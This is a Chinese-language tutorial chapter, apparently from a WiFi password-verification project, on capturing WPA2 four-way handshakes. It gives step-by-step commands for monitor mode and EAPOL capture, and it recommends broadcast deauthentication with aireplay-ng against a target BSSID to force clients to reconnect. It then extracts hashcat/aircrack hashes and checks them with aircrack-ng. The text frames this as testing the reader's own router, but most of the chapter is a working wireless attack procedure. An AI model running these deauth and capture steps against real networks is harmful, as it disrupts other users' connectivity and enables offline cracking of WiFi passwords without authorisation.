# 第 3 章 被动抓取 WPA2 握手

> 抓取**真实 WiFi 的 WPA2 四次握手**是本项目**密码自动验证**的基础。思路：让受害设备（手机）与 AP 重新完成一次连接，在中间监听捕获 EAPOL 帧。

## 3.1 原理：WPA2 四次握手

```
手机 ──(1) AP→手机: ANonce──────────┐
 │ ──(2) 手机→AP: SNonce+MIC────────┤ 这 4 个帧组合起来
 │ ──(3) AP→手机: GTK+MIC───────────┤ 就能离线验证密码
 │ ──(4) 手机→AP: ACK──────────────┘
```

- 密码不直接在握手帧里传输，但 **PMK 由 SSID+密码 派生**，验证候选密码是否等于真实密码，只需重新算 PMK 与握手比对（见第 6 章）
- 抓到手握 = 拿到"验证基准"

## 3.2 方法一：手动触发重连（学习用）

```bash
# 1. 固定信道监听（monitor 模式）
sudo nmcli dev set wlxYOUR_IFACE managed no
sudo ip link set wlxYOUR_IFACE down
sudo iw dev wlxYOUR_IFACE set type monitor
sudo ip link set wlxYOUR_IFACE up
sudo iw dev wlxYOUR_IFACE set channel 6

# 2. 抓包（后台跑 60 秒）
sudo timeout 60 tcpdump -i wlxYOUR_IFACE -w handshake.pcap "ether proto 0x888e" &

# 3. 让手机断开 WiFi 再重连（产生完整握手）
#    手机上：设置 → WiFi → 断开 → 重新连接
```

## 3.3 方法二：deauth 自动触发重连（推荐，全自动）

手机被 deauth 踢下线后，会自动重连 AP → 产生完整握手，无需人工配合：

```bash
# 复用本仓库脚本（BSSID 换成你的目标）
sudo bash scripts/auto_capture_handshake.sh C8:75:F4:40:D6:8A 6 gf7e
```

脚本流程：
1. monitor 模式 + 固定信道
2. 后台 airodump-ng 抓 140 秒
3. 4 轮广播 deauth（`aireplay-ng -0 3 -a <BSSID>`）踢掉所有客户端
4. 自动提取 hash（.22000 和 .hccapx 两种格式）

## 3.4 提取 hash

```bash
# 从 pcap 提取 hashcat 22000 格式
hcxpcapngtool -o gf7e.22000 hs-01.cap

# 提取 aircrack-ng hccapx 格式（本项目验证用）
hcxpcapngtool --hccapx=gf7e.hccapx hs-01.cap
```

**判断握手是否有效**（关键！）：

```
EAPOL M1 messages (total)............: 98   ← M1 很多（重传）
EAPOL M2 messages (total)............: 1    ← 关键：M2/M3/M4 至少各 1
EAPOL M3 messages (total)............: 2
EAPOL M4 messages (total)............: 2
EAPOL pairs written to hccapx........: 1 (RC checked)   ← RC 校验通过 = 有效
```

> ⚠️ **实测血泪坑**：只抓到 `M2` 没有 `M1` 的 pcap **提取不出有效握手**，`hcxpcapngtool` 会报 `This dump file does not contain enough EAPOL M1 frames`。而且**即使提取成功也可能得到无效 hash**——判断标准永远是：`aircrack-ng` 用**已知正确密码**验证能出 `KEY FOUND`。

## 3.5 验证握手有效性

```bash
# 用你确定的正确密码测试（你自己的路由器）
echo '你的真实密码' > /tmp/t.txt
aircrack-ng -w /tmp/t.txt -b C8:75:F4:40:D6:8A gf7e.hccapx
```

| 输出 | 含义 |
|---|---|
| `KEY FOUND! [ 你的真实密码 ]` | ✅ 握手有效 + 密码正确 |
| `KEY NOT FOUND` | ⚠️ 密码错 **或** 握手无效 |
| Master Key 全 0 / EAPOL HMAC 全 0 | ❌ **握手无效**（重抓） |

> ⚠️ **实测案例**：本项目中旧握手 `gf7e.hccapx` 显示 Master Key 全零（无效数据），导致"正确密码也被判错"，浪费大量排查时间。**结论：抓完握手必须用已知密码验证一次，确认 `KEY FOUND` 再投入使用。**

## 3.6 修改密码后必须重抓

验证基准（握手）与密码绑定：**改 WiFi 密码后，旧握手立即失效**，必须重新抓握手（回到 3.3）。
